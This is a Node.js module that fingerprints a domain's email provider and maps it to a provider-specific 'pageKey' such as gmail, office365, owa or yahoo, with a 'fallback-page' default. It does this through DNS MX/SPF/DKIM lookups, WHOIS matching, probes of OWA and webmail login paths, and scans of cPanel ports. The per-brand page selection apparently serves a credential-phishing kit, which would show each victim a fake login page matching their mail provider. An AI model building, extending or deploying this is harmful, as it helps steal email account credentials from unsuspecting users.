const dns = require("dns").promises;
const net = require("net");
const https = require("https");
const http = require("http");
const whois = require("whois-json");

const cache = new Map();
const TTL_MS = 5 * 60 * 1000;

function setCache(domain, data) {
  cache.set(domain, { data, expires: Date.now() + TTL_MS });
}

function getCache(domain) {
  const cached = cache.get(domain);
  if (!cached || Date.now() > cached.expires) {
    cache.delete(domain);
    return null;
  }
  return cached.data;
}

// Platform map
const platformToPageKey = {
  126: "126",
  163: "163",
  aol: "aol",
  aruba: "aruba",
  "fallback-page": "fallback-page",
  general: "general",
  google: "gmail",
  gmx: "gmx",
  outlook: "outlook",
  icewarp: "icewarp",
  libero: "libero",
  office365: "office365",
  qq: "qq",
  roundcube: "roundcube",
  sina: "sina",
  smartermail: "smartermail",
  yahoo: "yahoo",
  yandex: "yandex",
  zimbra: "zimbra",
  zoho: "zoho",
  owa: "owa"
};

// Known platform indicators
const knownPlatforms = {
  "126": ["126.com", "mx.126.com", "_spf.126.com", "126mx01.mxmail.netease.com", "126mx00.mxmail.netease.com", "126mx02.mxmail.netease.com", "126mx03.mxmail.netease.com"],
  "163": ["163.com", "mx.163.com", "_spf.163.com", "163mx01.mxmail.netease.com", "163mx02.mxmail.netease.com", "163mx00.mxmail.netease.com", "163mx03.mxmail.netease.com"],
  aol: ["aol.com", "mx.aol.com", "mx-aol", "_spf.aol.com"],
  aruba: ["aruba.it", "mx.aruba.it", "smtp.secureserver.net", "_spf.aruba.it"],
  google: ["gmail.com", "google.com", "aspmx.l.google.com", "alt1.aspmx.l.google.com", "_spf.google.com"],
  gmx: ["gmx.net", "gmx.com", "mx00.gmx.net", "mx01.gmx.net", "_spf.gmx.net"],
  outlook: ["hotmail.com", "outlook.com", "live.com", "office365.com", "protection.outlook.com", "_spf.protection.outlook.com"],
  icewarp: ["icewarp.com", "icewarpcloud.com", "mx.icewarp.com", "_spf.icewarp.com"],
  libero: ["libero.it", "mx.libero.it", "_spf.libero.it"],
  office365: ["office365.com", "outlook.com", "protection.outlook.com", "microsoft.com", "_spf.protection.outlook.com"],
  qq: ["qq.com", "mx.qq.com", "_spf.qq.com"],
  roundcube: ["roundcube.net", "roundcube", "webmail", "mail", "smtp"],
  sina: ["sina.com", "sina.cn", "mx.sina.com.cn", "_spf.sina.com"],
  smartermail: ["smartermail.com", "smartertools.com", "mx.smartermail.com", "_spf.smartermail.com"],
  yahoo: ["yahoo.com", "yahoodns.net", "mx.mail.yahoo.com", "_spf.mail.yahoo.com"],
  yandex: ["yandex.ru", "yandex.net", "mx.yandex.net", "_spf.yandex.net"],
  zimbra: ["zimbra.com", "zimbra.mail", "mx.zimbra.com"],
  zoho: ["zoho.com", "mx.zoho.com", "zoho.eu", "_spf.zoho.com"],
  owa: ["exchange", "outlook", "autodiscover", "office365"],
  cpanel: ["cpanel", "webmail", "secureserver.net", "smtp.secureserver.net"],
  general: ["mail.", "mx.", "smtp."],
  "fallback-page": []
};

// Fast-path direct domain aliases (exact domain -> platform)
const directDomainAliases = {
  google: ["gmail.com", "googlemail.com"],
  yahoo: ["yahoo.com", "yahoo.co.uk", "yahoodns.net"],
  aol: ["aol.com"],
  "126": ["126.com"],
  "163": ["163.com"],
  outlook: ["outlook.com", "hotmail.com", "live.com", "msn.com"],
  gmx: ["gmx.com", "gmx.net"],
  zoho: ["zoho.com", "zoho.eu"],
  yandex: ["yandex.ru", "yandex.com"],
  qq: ["qq.com"],
  zimbra: ["zimbra.com"],
  office365: ["office365.com", "office.com", "microsoft.com"]
};

// Scoring config
const scoringWeights = { mx: 10, spf: 3, dkim: 1 };

// Priority indicators (arrays allow multiple substrings per platform)
const priorityIndicators = {
  "126": ["126mx"],
  "163": ["163mx"],
  aol: ["aol", "mx-aol", "mx.aol"], // cover variants
  // add others as needed
};

// Probe TCP port helper
function probePort(domain, port, timeout = 3000) {
  return new Promise((resolve) => {
    const socket = net.createConnection({ host: domain, port, timeout });
    socket.on("connect", () => {
      socket.destroy();
      resolve(true);
    });
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => {
      socket.destroy();
      resolve(false);
    });
  });
}

// Probe common webmail paths over HTTPS then HTTP
async function probeWebmail(domain) {
  const paths = ["/webmail", "/roundcube", "/horde", "/mail", "/webmail/", "/roundcube/"];
  const tryUrl = (protocol, domain, path) =>
    new Promise((resolve) => {
      const client = protocol === "https" ? https : http;
      const req = client.get(`${protocol}://${domain}${path}`, { timeout: 3000 }, (res) => {
        // Accept 200-399 as present (redirects may happen)
        if (res.statusCode >= 200 && res.statusCode < 400) {
          resolve(path.includes("roundcube") ? "roundcube" : path);
        } else {
          resolve(null);
        }
        res.resume();
      });
      req.on("error", () => resolve(null));
      req.on("timeout", () => {
        req.destroy();
        resolve(null);
      });
    });

  for (const path of paths) {
    const httpsResult = await tryUrl("https", domain, path);
    if (httpsResult) return httpsResult;
    const httpResult = await tryUrl("http", domain, path);
    if (httpResult) return httpResult;
  }
  // SmarterMail special check (interface path)
  const smarter = await tryUrl("http", domain, "/interface/root#/login");
  if (smarter) return "smartermail";
  return null;
}

// WHOIS heuristic
async function getWhoisPlatform(domain) {
  try {
    const whoisData = await whois(domain);
    const raw = JSON.stringify(whoisData).toLowerCase();
    for (const [platform, indicators] of Object.entries(knownPlatforms)) {
      if (indicators.some((keyword) => raw.includes(keyword))) {
        return platform;
      }
    }
  } catch (err) {
    // ignore whois failures
  }
  return null;
}

// Autodiscover SRV check for Exchange/OWA
async function checkAutodiscover(domain) {
  try {
    const srv = await dns.resolveSrv(`_autodiscover._tcp.${domain}`);
    if (srv && srv.length > 0) {
      const target = srv[0].name.toLowerCase();
      if (target.includes("outlook") || target.includes("exchange") || target.includes("office365")) {
        return "owa";
      }
    }
  } catch {
    // no SRV
  }
  return null;
}

// Score platforms from DNS indicators
function scorePlatforms(mxHosts = [], spfRecords = [], dkimRecords = []) {
  const scores = {};

  // initialize
  for (const platform of Object.keys(knownPlatforms)) {
    scores[platform] = 0;
  }

  for (const [platform, indicators] of Object.entries(knownPlatforms)) {
    const lowerIndicators = indicators.map((s) => s.toLowerCase());

    mxHosts.forEach((mx) => {
      const mxLower = mx.toLowerCase();
      if (lowerIndicators.some((i) => mxLower.includes(i))) {
        // priority boost when indicated
        const priorities = priorityIndicators[platform] || [];
        const hasPriority = priorities.some((p) => mxLower.includes(p));
        const boost = hasPriority ? scoringWeights.mx * (platform === "aol" ? 5 : 2) : scoringWeights.mx;
        scores[platform] += boost;
      }
    });

    spfRecords.forEach((spf) => {
      const spfLower = spf.toLowerCase();
      if (lowerIndicators.some((i) => spfLower.includes(i))) {
        const priorities = priorityIndicators[platform] || [];
        const hasPriority = priorities.some((p) => spfLower.includes(p));
        const boost = hasPriority ? scoringWeights.spf * 2 : scoringWeights.spf;
        scores[platform] += boost;
      }
    });

    dkimRecords.forEach((dkim) => {
      const dkimLower = dkim.toLowerCase();
      if (lowerIndicators.some((i) => dkimLower.includes(i))) {
        scores[platform] += scoringWeights.dkim;
      }
    });
  }

  // determine top platforms
  const highestScore = Math.max(...Object.values(scores));
  let topPlatforms = Object.entries(scores)
    .filter(([, score]) => score === highestScore && score > 0)
    .map(([platform]) => platform);

  // if tie, prefer non-generic (not roundcube/general/fallback-page)
  if (topPlatforms.length > 1) {
    const filtered = topPlatforms.filter((p) => !["roundcube", "general", "fallback-page"].includes(p));
    if (filtered.length > 0) topPlatforms = filtered;
  }

  return { topPlatforms, scores };
}

// Main detection function
async function detectPlatform(domain) {
  const cached = getCache(domain);
  if (cached) return cached;

  const result = {
    domain,
    platform: "fallback-page",
    pageKey: "fallback-page",
    mxHosts: [],
    spfTxts: [],
    dkimSelectors: [],
    webmailPath: null,
    whoisMatch: null,
    error: null
  };

  try {
    const domainLower = domain.toLowerCase();

    // FAST-PATH: exact domain alias match
    for (const [platform, aliases] of Object.entries(directDomainAliases)) {
      if (aliases.some((a) => a === domainLower)) {
        result.platform = platform;
        result.pageKey = platformToPageKey[platform] || platform;
        setCache(domain, result);
        console.log("🔎 Detection Result (direct match):", {
          domain,
          platform: result.platform,
          pageKey: result.pageKey
        });
        return result;
      }
    }

    // ─── NEW: Check OWA endpoint first (fast heuristic) ─────────────────
    // Try /owa/auth/logon.aspx over HTTPS then HTTP - prefer OWA early
    async function probeOwa(domain) {
      const paths = ["/owa/auth/logon.aspx", "/owa/"];
      const tryUrl = (protocol, domain, path) =>
        new Promise((resolve) => {
          const client = protocol === "https" ? https : http;
          const req = client.get(`${protocol}://${domain}${path}`, { timeout: 3000 }, (res) => {
            if (res.statusCode >= 200 && res.statusCode < 400) {
              resolve(true);
            } else {
              resolve(false);
            }
            res.resume();
          });
          req.on("error", () => resolve(false));
          req.on("timeout", () => {
            req.destroy();
            resolve(false);
          });
        });

      for (const p of paths) {
        try {
          const httpsOk = await tryUrl("https", domain, p);
          if (httpsOk) return true;
          const httpOk = await tryUrl("http", domain, p);
          if (httpOk) return true;
        } catch {
          // ignore
        }
      }
      return false;
    }

    // If OWA endpoint exists, return immediately as 'owa'
    try {
      const hasOwa = await probeOwa(domain);
      if (hasOwa) {
        result.platform = "owa";
        result.pageKey = platformToPageKey["owa"] || "owa";
        setCache(domain, result);
        console.log("🔎 Detection Result (owa fast-path):", {
          domain,
          platform: result.platform,
          pageKey: result.pageKey
        });
        return result;
      }
    } catch (err) {
      // non-fatal, continue with DNS heuristics
    }
    // ───────────────────────────────────────────────────────────────────

    // MX
    try {
      const mx = await dns.resolveMx(domain);
      result.mxHosts = mx.map((r) => r.exchange.toLowerCase());
    } catch (err) {
      result.mxHosts = [];
    }

    // SPF (TXT)
    try {
      const txts = await dns.resolveTxt(domain);
      result.spfTxts = txts
        .flat()
        .map((t) => t.toLowerCase())
        .filter((t) => t.includes("v=spf1"));
    } catch {
      result.spfTxts = [];
    }

    // DKIM selectors probe
    const commonSelectors = ["default", "selector1", "selector2"];
    for (const selector of commonSelectors) {
      try {
        const dkimTxt = await dns.resolveTxt(`${selector}._domainkey.${domain}`);
        result.dkimSelectors.push(dkimTxt.flat().join(""));
      } catch {
        // ignore
      }
    }

    // Score platforms
    const { topPlatforms, scores } = scorePlatforms(result.mxHosts, result.spfTxts, result.dkimSelectors);
    if (topPlatforms && topPlatforms.length > 0) {
      // If AOL is among top and has strong MX indicator, prefer it over Yahoo
      if (topPlatforms.includes("aol")) {
        result.platform = "aol";
      } else {
        result.platform = topPlatforms[0];
      }
    }

    // Probe webmail endpoints (may override in specific cases)
    const webmail = await probeWebmail(domain);
    if (webmail) {
      result.webmailPath = webmail;
      if (webmail === "smartermail") result.platform = "smartermail";
      else if (webmail === "roundcube") result.platform = "roundcube";
    }

    // WHOIS heuristic (fallback)
    const whoisMatch = await getWhoisPlatform(domain);
    if (whoisMatch && result.platform === "fallback-page") {
      result.platform = whoisMatch;
      result.whoisMatch = whoisMatch;
    }

    // Autodiscover SRV fallback (Exchange/OWA)
    if (result.platform === "fallback-page") {
      const autod = await checkAutodiscover(domain);
      if (autod) result.platform = autod;
    }

    // cPanel ports probe
    const isCpanel = (await probePort(domain, 2095)) || (await probePort(domain, 2096));
    if (isCpanel) result.platform = "cpanel";

    result.pageKey = platformToPageKey[result.platform] || "fallback-page";
    setCache(domain, result);

    // Log compact result
    console.log("🔎 Detection Result:", {
      domain,
      platform: result.platform,
      pageKey: result.pageKey,
      mx: result.mxHosts,
      spf: result.spfTxts,
      dkim: result.dkimSelectors,
      webmail: result.webmailPath,
      whois: result.whoisMatch
    });
  } catch (err) {
    result.error = String(err);
    console.error("Detection error:", err);
  }

  return result;
}

module.exports = { detectPlatform, scorePlatforms };
